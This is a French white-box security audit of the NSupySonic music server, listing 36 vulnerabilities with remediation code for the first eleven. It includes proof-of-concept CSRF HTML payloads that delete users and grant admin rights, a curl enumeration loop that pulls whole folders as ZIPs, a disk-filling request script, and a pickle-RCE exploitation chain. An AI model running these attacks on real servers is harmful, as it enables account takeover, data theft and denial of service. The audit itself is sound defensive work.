# Audit de sécurité offensif — NSupySonic

> **Cadre.** Revue red team « boîte blanche » de l'intégralité du dépôt : serveur Flask
> (`supysonic/`), API Subsonic (`/rest`), API web maison (`/api`), SPA Svelte (`/app`),
> client Deezer vendorisé (`deezerpy/`), application Android (`android/`), packaging
> Docker et CI.
>
> **Date :** 2026-07-29 · **Révision auditée :** `004d5a0` · **Méthode :** lecture
> exhaustive du code + vérification empirique des hypothèses critiques.
>
> **Posture supposée.** Serveur auto-hébergé exposé sur Internet (c'est le cas d'usage
> décrit par le README/Docker : port publié, app Android distante), avec un admin et
> N comptes invités. Le modèle de menace retenu couvre donc : l'attaquant **non
> authentifié** sur le réseau, l'**invité authentifié** (le compte le plus intéressant
> à abuser : il existe, il est facile à obtenir, et il a énormément de surface), le
> **voisin réseau** (Wi-Fi partagé, app Android), et l'**attaquant post-fuite** (sauvegarde
> de base de données volée).

---

## Sommaire exécutif

**36 constats.** 4 critiques, 8 élevés, 13 moyens, 11 faibles / durcissement.

Trois problèmes structurent tout le reste :

1. **Le durcissement du cookie de session ne s'applique pas.** `SESSION_COOKIE_SAMESITE`
   et `SESSION_COOKIE_SECURE` sont posés avec `setdefault()` sur des clés que Flask
   définit déjà → les deux appels sont des **no-op**. Vérifié empiriquement. La
   protection CSRF que le commentaire du code revendique n'existe pas, et l'option de
   configuration `session_cookie_secure = yes` est silencieusement ignorée.
2. **Il n'y a aucun jeton CSRF nulle part**, et plusieurs mutations sensibles de
   l'interface d'admin se font en **GET** (`/user/del/<uid>`, `/folder/del/<id>`).
   Celles-là sont exploitables *même* si SameSite=Lax fonctionnait.
3. **La base de données est un point de défaillance total.** Elle contient les mots de
   passe réversibles (`password_clear`), la clé qui les déchiffre (`Meta.password_secret`),
   la clé de signature des cookies (`Meta.cookies_secret`) et la clé d'authentification
   du démon (`Meta.daemon_key`) — laquelle ouvre une **RCE par `pickle`**. Une seule
   sauvegarde qui fuit et tout tombe, y compris les mots de passe réutilisés ailleurs.

Le reste se répartit en trois familles : **cloisonnement inter-utilisateurs inexistant**
(les uploads de tout le monde sont lisibles par tout le monde), **déni de service trivial**
(1 worker gunicorn, ffmpeg synchrone, file de téléchargement non bornée), et **exposition
de l'ARL** — qui est, rappelons-le, une credential de compte Deezer complète.

### Tableau de bord

| ID | Constat | Sévérité | Attaquant requis |
|---|---|---|---|
| [NS-01](#ns-01) | `SameSite`/`Secure` du cookie jamais appliqués (`setdefault` no-op) | 🔴 Critique | Non authentifié |
| [NS-02](#ns-02) | Aucune protection CSRF ; mutations admin en GET | 🔴 Critique | Non authentifié |
| [NS-03](#ns-03) | Mots de passe réversibles + clé dans la même base | 🔴 Critique | Post-fuite DB |
| [NS-04](#ns-04) | IPC du démon via `pickle` (RCE) sur socket `/tmp` prévisible | 🔴 Critique | Local / post-fuite |
| [NS-05](#ns-05) | Mass assignment sur `/user/add` → `admin=1` | 🟠 Élevé | Admin (via CSRF) |
| [NS-06](#ns-06) | `/rest/download?id=<folder>` zippe **tout** le dossier récursivement | 🟠 Élevé | Invité authentifié |
| [NS-07](#ns-07) | Uploads non cloisonnés entre utilisateurs | 🟠 Élevé | Invité authentifié |
| [NS-08](#ns-08) | Épuisement disque via `/api/download` (file non bornée) | 🟠 Élevé | Invité authentifié |
| [NS-09](#ns-09) | Gel du serveur via ffmpeg synchrone (1 worker / 8 threads) | 🟠 Élevé | Invité authentifié |
| [NS-10](#ns-10) | Quota d'upload contournable (TOCTOU) | 🟠 Élevé | Invité authentifié |
| [NS-11](#ns-11) | Rate-limit d'auth : verrouillage global derrière un proxy | 🟠 Élevé | Non authentifié |
| [NS-12](#ns-12) | Sessions non révocables, pas de régénération à la connexion | 🟠 Élevé | Vol de cookie |
| [NS-13](#ns-13) | `changePassword` sans mot de passe actuel | 🟡 Moyen | Vol de token |
| [NS-14](#ns-14) | Credentials Subsonic en clair dans l'URL, token MD5 | 🟡 Moyen | Réseau / logs |
| [NS-15](#ns-15) | JSONP `callback` non validé → gadget de contournement CSP | 🟡 Moyen | Authentifié |
| [NS-16](#ns-16) | `getLyrics` : XML non fiable en HTTP clair → bombe XML | 🟡 Moyen | MITM |
| [NS-17](#ns-17) | Ids non validés injectés dans les URL sortantes Deezer | 🟡 Moyen | Invité authentifié |
| [NS-18](#ns-18) | SSRF via `stream_url` des épisodes (redirections suivies) | 🟡 Moyen | Upstream hostile |
| [NS-19](#ns-19) | Android : cleartext + trust-all SSL + pont JS exposé | 🟡 Moyen | Voisin réseau |
| [NS-20](#ns-20) | Fuite de l'ARL (conf en clair, env du conteneur, ps) | 🟡 Moyen | Accès hôte |
| [NS-21](#ns-21) | Chaîne d'approvisionnement : pas de lockfile, deps flottantes | 🟡 Moyen | Supply chain |
| [NS-22](#ns-22) | CSP trop permissive, pas de HSTS | 🟡 Moyen | Post-injection |
| [NS-23](#ns-23) | 500 non gérés en pagaille (`int()`, `uuid.UUID()`) | 🟡 Moyen | Non authentifié |
| [NS-24](#ns-24) | `addChatMessage` non borné, non limité | 🟡 Moyen | Invité authentifié |
| [NS-25](#ns-25) | `Content-Disposition` construit depuis des tags utilisateur | 🟡 Moyen | Invité authentifié |
| [NS-26](#ns-26) | Threads non bornés (`_push_async`) | 🟠 Élevé | Invité authentifié |
| [NS-27](#ns-27) | Pas de journal d'audit des actions d'administration | 🟡 Moyen | — |
| [NS-28](#ns-28) | Mots de passe par défaut (`changeme`, `supysonic`) | 🔵 Faible | Config |
| [NS-29](#ns-29) | Aucune politique de mot de passe | 🔵 Faible | — |
| [NS-30](#ns-30) | `LIKE` non échappé → scans coûteux | 🔵 Faible | Invité authentifié |
| [NS-31](#ns-31) | Bombes de décompression PIL sur les pochettes | 🔵 Faible | Invité authentifié |
| [NS-32](#ns-32) | `IniConfig` : sections inconnues injectées dans `app.config` | 🔵 Faible | Config |
| [NS-33](#ns-33) | Croissance non bornée des tables progress/markers | 🔵 Faible | Invité authentifié |
| [NS-34](#ns-34) | `_valid_id()` accepte les chiffres Unicode et `-` | 🔵 Faible | Invité authentifié |
| [NS-35](#ns-35) | Le catalogue Deezer payant est ouvert à tous les invités | 🔵 Faible | Invité authentifié |
| [NS-36](#ns-36) | `Cache._filepath` lève `ValueError` → 500 au lieu de 400 | 🔵 Faible | Invité authentifié |

---

## 1. Surface d'attaque

```
                        Internet
                            │
        ┌───────────────────┼────────────────────┐
        │                   │                    │
   /  (admin UI)       /rest (Subsonic)     /api (+ /app SPA)
   session cookie      u+p ou t+s par        session cookie
   "userid"            requête, pas de       "uid"
   pas de token CSRF   cookie                pas de token CSRF
        │                   │                    │
        └───────────────────┴────────────────────┘
                            │
                ┌───────────┴───────────┐
                │                       │
        Base de données          Répertoire d'archive
        (secrets + mots de       (FLAC, uploads de TOUS
         passe réversibles)       les utilisateurs, .lrc)
                │                       │
                └───────────┬───────────┘
                            │
                   Démon (socket UNIX, pickle)
                            │
                    ffmpeg / lame / flac  ← sous-processus
                            │
                  Deezer (ARL = compte complet), LRCLIB,
                  chartlyrics (HTTP clair), hôtes de podcasts
```

**Points d'entrée non authentifiés :** `/user/login` (POST), `/api/login` (POST),
`/rest/*` (chaque requête porte ses credentials), `/app/*` (statique).

**Rôles.** Trois niveaux : anonyme → utilisateur (« invité ») → admin. Le contrôle
d'accès est réparti sur **quatre mécanismes différents** (`@admin_only` du frontend,
`@admin_only` de l'API Subsonic, `@admin_required` de `/api`, et des `if not _is_admin()`
inline). Cette dispersion est en soi un facteur de risque : les trois oublis relevés
plus bas (NS-06, NS-07, NS-35) sont tous des endpoints où le décorateur manquant n'a
pas sauté aux yeux.

---

## 2. Constats critiques

### <a id="ns-01"></a>NS-01 — 🔴 Le durcissement du cookie de session n'est jamais appliqué

**Fichier :** `supysonic/web.py:110-118`

```python
app.config.setdefault("SESSION_COOKIE_HTTPONLY", True)
app.config.setdefault("SESSION_COOKIE_SAMESITE", "Lax")
app.config.setdefault(
    "SESSION_COOKIE_SECURE",
    bool(app.config["WEBAPP"].get("session_cookie_secure", False)),
)
```

`Flask.default_config` **contient déjà** ces trois clés (`SAMESITE: None`,
`SECURE: False`, `HTTPONLY: True`). `dict.setdefault()` n'écrit que si la clé est
absente : les trois appels ne font donc **rien**.

**Vérification empirique** (Flask 3.1.3) :

```
SESSION_COOKIE_SAMESITE -> None   present: True
SESSION_COOKIE_SECURE   -> False  present: True
après setdefault: None / False        ← les valeurs voulues sont perdues
```

**Conséquences.**

* L'attribut `SameSite` **n'est jamais émis**. Le commentaire du code
  (« SameSite=Lax blocks the cookie on cross-site POSTs, mitigating CSRF on the
  mutating /api endpoints ») décrit une protection qui n'est pas déployée. Sur Firefox
  et Safari — qui n'appliquent pas le Lax-par-défaut de Chrome — **tous** les endpoints
  mutants de `/api` et de l'interface d'admin sont CSRF-ables en POST.
* L'option documentée `[webapp] session_cookie_secure = yes` est un **placebo** : le
  cookie de session part en clair sur HTTP même quand l'administrateur a explicitement
  demandé le contraire, ce qui est pire qu'une option absente (fausse assurance).

**Correctif.**

```python
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"
app.config["SESSION_COOKIE_SECURE"] = bool(
    app.config["WEBAPP"].get("session_cookie_secure", False)
)
```

Et un test de non-régression qui inspecte réellement l'en-tête `Set-Cookie` :

```python
def test_session_cookie_flags(self):
    rv = self.client.post("/api/login", json={"username": "alice", "password": "Alice"})
    cookie = rv.headers["Set-Cookie"]
    self.assertIn("HttpOnly", cookie)
    self.assertIn("SameSite=Lax", cookie)
```

> ⚠️ Ne pas se contenter d'un test sur `app.config` : c'est exactement ce que le code
> actuel « passerait » à tort si l'assertion portait sur la valeur voulue.

---

### <a id="ns-02"></a>NS-02 — 🔴 Aucune protection CSRF, et des mutations en GET

**Fichiers :** tout `supysonic/frontend/`, tout `supysonic/webui/__init__.py`

Aucun jeton CSRF n'existe dans le projet (`grep -ri csrf` ne renvoie que des
commentaires et une constante Deezer). Combiné à NS-01, **toute** action de l'admin
et de l'utilisateur est déclenchable depuis un site tiers.

Pire : plusieurs mutations sont exposées en **GET**, donc exploitables même si
SameSite=Lax fonctionnait (Lax laisse passer le cookie sur une navigation top-level GET,
et un `<img>` suffit dans les navigateurs qui n'appliquent pas Lax) :

| Route | Méthode | Effet |
|---|---|---|
| `/user/del/<uid>` | **GET** | Supprime un utilisateur |
| `/folder/del/<id>` | **GET** | Supprime un dossier racine + toute sa hiérarchie DB |
| `/folder/scan` · `/folder/scan/<id>` | **GET** | Déclenche un scan complet (DoS I/O) |
| `/user/<uid>/lastfm/unlink` | **GET** | Délie le compte Last.fm |
| `/user/<uid>/listenbrainz/unlink` | **GET** | Délie le compte ListenBrainz |
| `/user/<uid>/lastfm/link?token=…` | **GET** | **Lie le compte Last.fm de l'attaquant** |

**PoC — suppression silencieuse de tous les utilisateurs.** L'admin visite une page
piégée pendant qu'il est connecté à l'interface d'admin :

```html
<img src="http://musique.exemple/user/del/3f2b…-uuid" style="display:none">
<img src="http://musique.exemple/folder/del/1" style="display:none">
```

Les ids de dossier sont des entiers auto-incrémentés (`AutoField`) : `1`, `2`, `3`…
Aucune énumération n'est nécessaire.

**PoC — escalade de privilèges** (voir aussi [NS-05](#ns-05)) :

```html
<form id="f" method="POST" action="http://musique.exemple/user/add">
  <input name="user" value="pwn"><input name="passwd" value="Hunter2!">
  <input name="passwd_confirm" value="Hunter2!">
  <input name="admin" value="1">   <!-- mass assignment -->
</form><script>f.submit()</script>
```

**Correctif.**

1. Corriger NS-01 (condition nécessaire mais **pas** suffisante).
2. Ajouter des jetons CSRF synchronisés sur l'interface d'admin (`Flask-WTF`
   `CSRFProtect`, ou un jeton maison en `session` vérifié dans un `before_request`
   sur toutes les méthodes non sûres).
3. Passer **toutes** les mutations en POST/DELETE. Un GET ne doit jamais changer d'état.
4. Pour `/api` (consommé en `fetch` par la SPA), la défense la plus économique est un
   **contrôle d'origine** dans le `before_request` du blueprint :

```python
@webapi.before_request
def _reject_cross_site():
    if request.method in ("GET", "HEAD", "OPTIONS"):
        return
    origin = request.headers.get("Origin")
    if origin and origin != request.host_url.rstrip("/"):
        return jsonify({"error": "cross-origin request rejected"}), 403
    # Sec-Fetch-Site est envoyé par tous les navigateurs modernes
    if request.headers.get("Sec-Fetch-Site") not in (None, "same-origin", "none"):
        return jsonify({"error": "cross-site request rejected"}), 403
```

---

### <a id="ns-03"></a>NS-03 — 🔴 Mots de passe réversibles, clé stockée à côté

**Fichiers :** `supysonic/managers/user.py:34-49`, `supysonic/utils.py:18-43`,
`supysonic/db.py:541`

Pour supporter l'authentification par jeton Subsonic (`t = md5(password + s)`), le
serveur doit connaître le mot de passe **en clair**. Il le stocke donc chiffré :

```python
def _password_key():
    return hashlib.sha256(get_secret_key("password_secret")).digest()

def encrypt_password(plaintext):
    iv = get_random_bytes(16)
    cipher = AES.new(_password_key(), AES.MODE_CFB, iv)
    return base64.b64encode(iv + cipher.encrypt(plaintext.encode("utf-8"))).decode()
```

Et `get_secret_key()` range la clé… **dans la table `Meta` de la même base** dès que la
variable d'environnement n'est pas définie (le défaut).

**Impact.** Une sauvegarde de base qui fuit — un dump Postgres oublié, un volume Docker
mal permissionné, une injection SQL future, un accès en lecture au fichier SQLite —
donne :

* `Meta.password_secret` → **tous les mots de passe en clair**. C'est le pire scénario :
  les utilisateurs réutilisent leurs mots de passe, l'impact déborde très largement du
  serveur de musique.
* `Meta.cookies_secret` → **forge de n'importe quel cookie de session**, y compris
  celui de l'admin, sans mot de passe.
* `Meta.daemon_key` → voir [NS-04](#ns-04), c'est une RCE.

Le hachage argon2id de la colonne `password` est donc **cosmétique** : la version
réversible est juste à côté.

**Défauts cryptographiques secondaires :**

* **AES-CFB sans authentification** — malléable. Un attaquant qui peut écrire dans la
  base (mais pas lire la clé) peut retourner des bits du mot de passe déchiffré de
  façon contrôlée. À remplacer par AES-GCM ou `Fernet` a minima.
* `decrypt_password()` peut retourner des octets arbitraires (`.decode("utf-8")` peut
  lever, capté par un `except Exception` large dans `try_auth_token`).

**Correctif (par ordre de préférence).**

1. **Supprimer `password_clear`.** L'auth par jeton Subsonic est un vestige du protocole ;
   la plupart des clients modernes acceptent Basic/`p=` sur HTTPS. Ajouter une option
   `[webapp] subsonic_token_auth = no` et purger la colonne quand elle est désactivée.
2. Si le jeton doit rester : **imposer** `SUPYSONIC_SECRET_PASSWORD_SECRET` en variable
   d'environnement (refuser de démarrer sinon), pour que la clé ne soit **jamais** dans
   la base. C'est déjà supporté par `get_secret_key()` — il suffit de rendre le fallback
   base de données interdit pour cette clé-là.
3. Passer à un chiffrement authentifié (AES-GCM) avec un nonce par enregistrement.
4. Idem pour `cookies_secret` : hors base, et documenter sa rotation (qui invalide
   toutes les sessions — c'est précisément ce qu'on veut après un incident).

---

### <a id="ns-04"></a>NS-04 — 🔴 IPC du démon via `pickle` → exécution de code

**Fichiers :** `supysonic/daemon/server.py:38-70`, `supysonic/daemon/client.py`,
`supysonic/config.py:59-71`

```python
def __handle_connection(self, connection):
    cmd = connection.recv()          # ← multiprocessing.connection ⇒ pickle.loads
```

`multiprocessing.connection` sérialise avec `pickle`. **Tout ce qui arrive sur le
socket est désérialisé avant la moindre validation** — le `isinstance(cmd, DaemonCommand)`
en dessous s'exécute *après* que `pickle` a déjà pu instancier n'importe quoi via
`__reduce__`. C'est une RCE par conception.

Deux atténuations existent, et toutes deux sont fragiles :

* **`authkey`** = `get_secret_key("daemon_key")`, stockée… dans la base ([NS-03](#ns-03)).
  Qui lit la base exécute du code sur l'hôte du démon.
* **Le socket est un fichier UNIX**, donc local. Mais son chemin par défaut est
  `os.path.join(tempfile.gettempdir(), "supysonic", "supysonic.sock")`, soit
  `/tmp/supysonic/supysonic.sock` — **un chemin prévisible dans un répertoire partagé**.
  Sur un hôte multi-utilisateur, un utilisateur local non privilégié peut créer
  `/tmp/supysonic/` **avant** le démon et se placer en position de :
  * capturer le challenge HMAC de `multiprocessing` et le casser hors ligne si l'authkey
    est faible (elle ne l'est pas ici — 128 octets aléatoires — mais l'attaque est là) ;
  * intercepter les commandes du serveur web (chemins de la bibliothèque, etc.) ;
  * faire échouer le démarrage du démon (DoS).

**Chemin d'exploitation complet.** Fuite de base → `Meta.daemon_key` →
`Client(address, authkey=key).send(pickle_bomb)` → RCE sous l'identité du démon, qui a
accès en écriture à toute la bibliothèque et à la configuration (donc **à l'ARL**).

**Correctif.**

1. Placer le socket dans un répertoire **non partagé** et à permissions strictes :
   `/run/supysonic/` ou `$XDG_RUNTIME_DIR`, créé en `0700`, `os.umask(0o077)` avant
   `Listener()`. Refuser de démarrer si le répertoire est world-writable.
2. Remplacer la couche transport par un protocole **non exécutable** : JSON avec une
   liste blanche de commandes (`{"cmd": "scan", "folders": [...]}`) au lieu d'objets
   `DaemonCommand` picklés. C'est un changement mécanique — il y a moins de dix commandes.
3. Sortir `daemon_key` de la base (variable d'environnement obligatoire).

---

## 3. Constats élevés

### <a id="ns-05"></a>NS-05 — 🟠 Mass assignment sur la création d'utilisateur

**Fichier :** `supysonic/frontend/user.py:249-275`

```python
args = request.form.copy()
(name, passwd, passwd_confirm) = map(args.pop, ("user", "passwd", "passwd_confirm"), (None,)*3)
...
UserManager.add(name, passwd, **args)      # ← tout le reste du formulaire
```

`UserManager.add` transmet `**kwargs` à `User.create(...)`. **Tout champ de formulaire
non consommé devient une colonne du modèle `User`** :

| Champ injecté | Effet |
|---|---|
| `admin=1` | Compte administrateur (chaîne non vide = vrai) |
| `jukebox=1` | Accès au jukebox (exécution du `jukebox_command`) |
| `password_clear=<blob>` | Écrase le stockage réversible |
| `lastfm_session=…` | Détourne la session Last.fm |
| `mail=…` | Sans validation (déjà connu — cf. `# No validation, lol.`) |

Le formulaire HTML propose bien une case « admin », mais rien côté serveur ne restreint
la liste des champs acceptés : le jour où une colonne sensible est ajoutée au modèle,
elle devient immédiatement assignable depuis Internet.

**Couplé à [NS-02](#ns-02), c'est le chemin d'escalade de privilèges le plus court du
projet** : une page piégée visitée par l'admin crée un compte admin pour l'attaquant.

**Correctif — liste blanche explicite :**

```python
ALLOWED = {"mail", "admin", "jukebox"}
extra = {k: v for k, v in request.form.items() if k in ALLOWED}
extra["admin"] = request.form.get("admin") is not None
extra["jukebox"] = request.form.get("jukebox") is not None
UserManager.add(name, passwd, **extra)
```

Et durcir la barrière côté `UserManager.add` (elle est appelée aussi par la CLI et par
`/rest/createUser`) en refusant tout kwarg hors liste blanche.

---

### <a id="ns-06"></a>NS-06 — 🟠 `/rest/download?id=<folderId>` exfiltre tout le dossier

**Fichier :** `supysonic/api/media.py:322-393`

```python
z = ZipStream(sized=True)
if isinstance(rv, Folder):
    z.add_path(rv.path, recurse=True)     # ← AUCUN filtre d'extension
```

Pour un `Track` ou un `Album`, le code sélectionne soigneusement les fichiers. Pour un
**`Folder`**, il zippe **la totalité de l'arborescence** — audio, `.lrc`, `cover.jpg`,
mais aussi n'importe quel fichier non-audio qui traînerait dans ces répertoires
(sauvegardes, `.env` égaré, notes, `.git`…).

Trois aggravants :

* **Aucun contrôle de rôle.** N'importe quel compte authentifié, invité compris, peut
  appeler `/rest/download`.
* **Les ids de dossier sont des entiers séquentiels** (`AutoField`) : `?id=1`, `?id=2`…
  L'énumération est immédiate.
* Le dossier racine « Deezer » **est** le répertoire d'archive, qui contient
  `Uploads/<user-id>/` pour **tous** les utilisateurs (voir [NS-07](#ns-07)).

**PoC.**

```bash
for i in $(seq 1 20); do
  curl -s "https://musique.exemple/rest/download.view?u=invite&p=pw&c=x&v=1.12.0&id=$i" \
       -o "dump-$i.zip"
done
```

Un invité repart avec la bibliothèque complète et les fichiers privés de tous les
autres comptes, en une boucle de dix lignes.

**Combiné à [NS-05](#ns-05) → lecture arbitraire du système de fichiers :** un admin
(obtenu par CSRF) peut enregistrer `/` comme dossier racine — `FolderManager.add`
(`supysonic/managers/folder.py:25-56`) **ne restreint aucun chemin**, il vérifie
seulement que c'est un répertoire existant et qu'il ne chevauche pas un dossier déjà
enregistré. Un `/rest/download?id=N` suivant exfiltre alors tout ce que le processus
peut lire : `/data/supysonic.conf` (**l'ARL**), `/etc/passwd`, les clés SSH montées…

**Correctif.**

1. Filtrer par extension dans le ZIP de dossier (réutiliser
   `supysonic.deezer.local.AUDIO_EXTS` + `covers.EXTENSIONS`), ou mieux : itérer sur
   les `Track` du dossier plutôt que sur le système de fichiers.
2. Restreindre `/rest/download` d'un `Folder` aux administrateurs, ou au minimum
   ajouter un rôle `downloadRole` réellement appliqué (il est déjà annoncé à `True`
   dans `as_subsonic_user()` sans jamais être vérifié).
3. Optionnel mais recommandé : borner les chemins acceptables par `FolderManager.add`
   à une liste blanche configurée (`[base] allowed_library_roots`).

---

### <a id="ns-07"></a>NS-07 — 🟠 Les uploads ne sont pas cloisonnés entre utilisateurs

**Fichiers :** `supysonic/webui/__init__.py:399-401, 466-486, 1683-1697, 2483-2564`

Les fichiers uploadés atterrissent dans `archive_dir/Uploads/<user-id>/` — **et c'est la
seule notion de propriété qui existe**. Elle sert uniquement à la comptabilité du quota.
Le modèle `Track` ne porte aucun propriétaire.

Conséquence : tout fichier uploadé par n'importe qui est accessible à **tous** les
comptes via :

| Route | Ce qu'elle expose |
|---|---|
| `GET /api/me/local` | La liste de **tous** les fichiers locaux (5000 max), tous utilisateurs confondus |
| `GET /api/search?q=` | Les mêmes, en recherche |
| `GET /api/stream/<uuid>` | Le fichier audio |
| `GET /api/localcover/<uuid>` · `/api/cover/<uuid>` | La pochette embarquée |
| `GET /api/share/file/<uuid>` | Le fichier complet en téléchargement nommé |
| `GET /api/share/clip/<uuid>` | Un extrait transcodé |
| `GET /api/export/…` | Un ZIP |
| `GET /rest/download?id=<folder>` | Tout, d'un coup ([NS-06](#ns-06)) |

Le nom de la route `/api/me/local` (« **me**/local ») suggère un périmètre personnel
qui n'existe pas : la requête ne filtre que sur `Track.deezer_id IS NULL`.

Il n'existe par ailleurs **aucun moyen de supprimer** un fichier uploadé : ni endpoint,
ni bouton. Un utilisateur ne peut pas retirer un fichier posté par erreur, et son quota
est définitivement consommé.

**Correctif.**

1. Ajouter `Track.owner` (FK nullable vers `User`), renseigné par `/api/upload`.
2. Filtrer sur `(Track.owner.is_null()) | (Track.owner == request.webuser)` dans
   `_local_search_tracks`, `my_local`, et **avant de servir** dans
   `stream`/`local_cover`/`cover`/`share_*`/`export_*`.
3. Ajouter `DELETE /api/local/<uuid>` (propriétaire ou admin) qui supprime la ligne
   **et** le fichier, et libère le quota.
4. Migration : les lignes existantes peuvent récupérer leur propriétaire depuis le
   segment `Uploads/<user-id>/` de leur chemin.

---

### <a id="ns-08"></a>NS-08 — 🟠 Épuisement du disque via `/api/download`

**Fichiers :** `supysonic/webui/__init__.py:2395-2428`, `supysonic/deezer/prefetch.py:45-53`

`/api/download` accepte jusqu'à **2000 ids par requête** (`_DOWNLOAD_BATCH_MAX`), les
pousse dans `_dl_queue`… qui est **explicitement non bornée** :

```python
# Separate, unbounded queue for explicit "download this playlist now" requests
self._dl_queue: queue.Queue = queue.Queue()
```

Le plafond par requête est le seul garde-fou, et il ne borne **rien du tout** : rien
n'empêche d'enchaîner les requêtes. Chaque id déclenche le téléchargement d'un **FLAC
complet** (20–60 Mo).

**PoC — remplissage du disque par un invité :**

```python
import itertools, requests
s = requests.Session()
s.post(URL + "/api/login", json={"username": "invite", "password": "…"})
ids = iter(itertools.count(1))          # les ids Deezer valides sont denses
while True:
    batch = [str(next(ids)) for _ in range(2000)]
    s.post(URL + "/api/download", json={"ids": batch})
```

Quatre workers (`download_workers`, plafonné à 8) tirent en continu. À ~30 Mo/piste,
le disque se remplit en quelques heures — et un disque plein casse SQLite, le cache
de transcodage et les journaux. Le commentaire du code identifie correctement le risque
(« one POST carrying a hundred thousand ids would pin the archiver for days and fill
the disk ») mais **la correction appliquée ne traite que le cas d'une seule requête**.

**Correctif.**

```python
_DL_QUEUE_MAX = 5000
self._dl_queue = queue.Queue(maxsize=_DL_QUEUE_MAX)

def download_ids(self, ids):
    queued = 0
    for tid in ids:
        try:
            self._dl_queue.put_nowait(tid)
            queued += 1
        except queue.Full:
            break
    return queued
```

Et, en complément :

* un quota d'archivage **par utilisateur** (même mécanique que `_quota_gb`, appliquée
  aux octets archivés à sa demande) ;
* un garde-fou global sur l'espace disque libre (`shutil.disk_usage`) qui suspend
  l'archivage sous un seuil configurable ;
* un rate-limit sur la route (voir [NS-09](#ns-09)).

---

### <a id="ns-09"></a>NS-09 — 🟠 Gel du serveur : ffmpeg synchrone sur 8 threads

**Fichiers :** `supysonic/webui/share.py:166-190, 300-355`, `supysonic/webui/export.py`,
`docker/gunicorn.conf.py`

La configuration de production, c'est **1 worker gunicorn / 8 threads**. Or plusieurs
routes ouvertes à tout compte authentifié lancent un ffmpeg **bloquant** :

| Route | Travail synchrone |
|---|---|
| `GET /api/share/waveform/<id>` | Décode **l'intégralité** du fichier en PCM 8 bits, puis boucle Python sur 400–4000 seaux |
| `GET /api/share/clip/<id>` | Coupe + réencode jusqu'à **600 s** d'audio, *jusqu'à complétion*, avant de répondre |
| `GET /api/share/file/<id>?fmt=mp3` | Transcode le **fichier entier**, jusqu'à complétion |
| `GET /api/stream/<id>?q=OPUS_320` | Transcode Opus |
| `GET /api/export/<kind>/<id>` | Archive + transcode **des centaines** de pistes |

Seul l'export est limité (1 en cours par utilisateur, `_claim_export`). Les autres
n'ont **aucune limite**.

**PoC :** huit requêtes concurrentes sur `/api/share/waveform/<id>` avec un id de piste
non encore archivée → chacune télécharge un FLAC puis le décode intégralement. Les huit
threads sont occupés ; le neuvième client (et l'admin, et le healthcheck) attendent.
Chaque requête abandonnée côté client ne tue pas forcément le ffmpeg de
`subprocess.run()` — il n'y a pas de `timeout=`.

**Correctif.**

1. Un `timeout=` sur **tous** les appels ffmpeg (`subprocess.run(..., timeout=120)`),
   avec `proc.kill()` en cas de dépassement.
2. Un sémaphore global bornant le nombre de transcodages simultanés, indépendamment du
   nombre de threads HTTP :

```python
_TRANSCODE_SLOTS = threading.Semaphore(
    int(os.environ.get("NS_MAX_TRANSCODES", "2"))
)
# 503 + Retry-After si acquire(timeout=…) échoue, plutôt que de faire la queue
```

3. Un rate-limit par utilisateur sur les routes coûteuses (`/api/share/*`,
   `/api/download`, `/api/export/*`) — le `RateLimiter` existant se généralise
   facilement avec une clé `f"{user.id}:{endpoint}"`.
4. Générer les formes d'onde **au moment de l'archivage** (en tâche de fond) plutôt qu'à
   la demande : c'est le même résultat, sans travail synchrone sur le chemin requête.

---

### <a id="ns-10"></a>NS-10 — 🟠 Quota d'upload contournable (TOCTOU)

**Fichier :** `supysonic/webui/__init__.py:2483-2564`

```python
used = _user_upload_usage(archive_dir, user)   # lu UNE fois, au début
for f in files:
    if quota_bytes:
        size = _stream_size(f.stream)
        if used + size > quota_bytes: ...      # comparé à une photo périmée
```

`used` est calculé **par requête**, sans verrou. N requêtes parallèles voient toutes le
même `used` initial et s'autorisent chacune à écrire jusqu'au quota complet : le quota
effectif devient `N × quota`.

Aggravants :

* `MAX_CONTENT_LENGTH` vaut **1 Go par requête** par défaut (`upload_max_size: 1024`).
* `_user_upload_usage` fait un `os.walk` complet du répertoire de l'utilisateur **à
  chaque upload et à chaque appel de `/api/upload/usage`** — sur des milliers de
  fichiers, c'est un coût I/O linéaire déclenchable à volonté (mini-DoS gratuit).
* Le contrôle d'extension repose sur le **nom de fichier**, pas sur le contenu. Un
  fichier arbitraire nommé `x.mp3` est écrit sur disque, puis effacé si `mediafile`
  n'arrive pas à le lire — mais il a bien transité par le disque, et un conteneur
  polyglotte (audio valide + charge utile appendue) reste stocké intégralement.

**Correctif.**

```python
_upload_locks = defaultdict(threading.Lock)   # ou un verrou DB / SELECT FOR UPDATE

with _upload_locks[user.id]:
    used = _user_upload_usage(archive_dir, user)
    ...  # écriture des fichiers dans la section critique
```

Mieux : maintenir l'usage dans une colonne/table (`UserQuota.bytes_used`) mise à jour
transactionnellement, avec le `os.walk` réservé à une réconciliation périodique. Et
baisser `upload_max_size` à une valeur réaliste (100 Mo suffisent pour un FLAC).

---

### <a id="ns-11"></a>NS-11 — 🟠 Le rate-limit d'authentification verrouille tout le monde

**Fichier :** `supysonic/ratelimit.py`

`RateLimiter(max_attempts=10, window=300)` est indexé sur `request.remote_addr`. Quatre
problèmes :

1. **Derrière un reverse proxy sans `proxy_fix_hops`** (le défaut : `0`),
   `request.remote_addr` est **l'IP du proxy** pour tout le monde. Dix échecs — un seul
   utilisateur qui se trompe de mot de passe, ou un attaquant qui le fait exprès —
   **bloquent l'authentification pour la totalité des utilisateurs** pendant 5 minutes,
   en boucle. C'est un DoS d'authentification à 10 requêtes.
2. **Symétriquement**, avec `proxy_fix_hops` mal réglé, l'attaquant contrôle l'en-tête
   `X-Forwarded-For` et **choisit sa clé de rate-limit** — le blocage devient nul.
3. **`auth_limiter.reset(remote_addr)` est appelé sur toute authentification réussie.**
   Un attaquant qui possède un compte invité valide remet le compteur à zéro entre
   chaque salve : le rate-limit ne le ralentit jamais.
4. **Pas de limite par compte.** Une attaque distribuée (botnet, sortie Tor) contre
   `admin` n'est pas ralentie du tout.

**Correctif.**

```python
# 1. clé composite : IP + nom d'utilisateur, et deux compteurs indépendants
auth_limiter.record_failure(f"ip:{request.remote_addr}")
auth_limiter.record_failure(f"user:{username.lower()}")

# 2. le succès ne réinitialise que la clé utilisateur, jamais la clé IP
auth_limiter.reset(f"user:{username.lower()}")
```

Ajouter un back-off exponentiel plutôt qu'une fenêtre fixe, journaliser les blocages,
et refuser de démarrer si `proxy_fix_hops == 0` alors qu'un `X-Forwarded-For` arrive
systématiquement (détection de mauvaise configuration au runtime).

